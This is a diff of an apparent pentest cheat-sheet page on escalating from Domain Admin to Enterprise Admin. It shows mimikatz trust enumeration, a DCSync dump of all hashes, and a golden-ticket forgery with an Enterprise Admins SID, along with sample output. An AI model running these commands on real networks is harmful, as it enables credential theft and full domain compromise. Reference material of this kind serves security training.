@@ -342,7 +342,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="privesc-from-da-domain-admin-to-ea-enterprise-admin">Privesc from DA (Domain Admin) to EA (Enterprise Admin)</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+<button data-tabset="set1" data-tabcontent="tab1" >Windows</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-check-trust-relationships">1. Check trust relationships</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get all trusted domain objects in a forest
@@ -387,6 +387,8 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SourceName     TargetName   TrustType TrustDirection
 </span></span></span><span class="line"><span class="cl"><span class="go">----------     ----------   --------- --------------
 </span></span></span><span class="line"><span class="cl"><span class="go">corp.example.com example.com  ParentChild  Bidirectional
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check forest trust
+</span></span><span class="line"><span class="cl"><span class="go">([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
 </span></span></span></code></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get current and target domain SID</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;lsadump::trust&#34; &#34;exit&#34;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; .\mimikatz.exe &#39;lsadump::trust&#39; &#39;exit&#39;
@@ -407,7 +409,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
 </span></span></span><span class="line"><span class="cl"><span class="go">Bye!
-</span></span></span></code></pre></div><h4 id="3-get-parent-machine-accounts-hash">3. Get parent machine account&rsquo;s hash</h4>
+</span></span></span></code></pre></div><h4 id="3-get-krbtgt-hash">3. Get krbtgt hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;lsadump::dcsync /all /csv&#34; &#34;exit&#34;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; .\mimikatz &#34;lsadump::dcsync /all /csv&#34; &#34;exit&#34;
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
@@ -433,7 +435,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">Bye!
 </span></span></span></code></pre></div><h4 id="4-forge-a-golden-ticket">4. Forge a golden ticket</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Append <span class="s1">&#39;-519&#39;</span> to target domain SID <span class="o">(</span>Enterprise Admins Group<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;kerberos::golden /user:Administrator /rc4:&lt;HASH&gt; /domain:&lt;CURRENT_DOMAIN&gt; /sid:&lt;CURRENT_DOMAIN_SID&gt; /sids:&lt;TARGET_DOMAIN_SID&gt;-519 /ticket:C:\ProgramData\ticket.kirbi&#34; &#34;exit&#34;
+</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;kerberos::golden /user:Administrator /domain:&lt;CURRENT_DOMAIN&gt; /sid:&lt;CURRENT_DOMAIN_SID&gt; /rc4:&lt;PARENT_HASH&gt; /sids:&lt;TARGET_DOMAIN_SID&gt;-519 /ticket:C:\ProgramData\ticket.kirbi&#34; &#34;exit&#34;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; .\mimikatz &#34;kerberos::golden /user:Administrator /rc4:f4de7fcd07c14a00ff96c5f900625529 /domain:CORP.EXAMPLE.COM /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /ticket:C:\ProgramData\ticket.kirbi&#34; &#34;exit&#34;
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
@@ -505,7 +507,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div></div></p>
 <h4 id="6-secrets-dump">6. Secrets Dump</h4>
 <p>
-<button data-tabset="set2" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set2" data-tabcontent="tab1" >Linux</button>
 
 <button data-tabset="set2" data-tabcontent="tab2" >Windows</button>
 
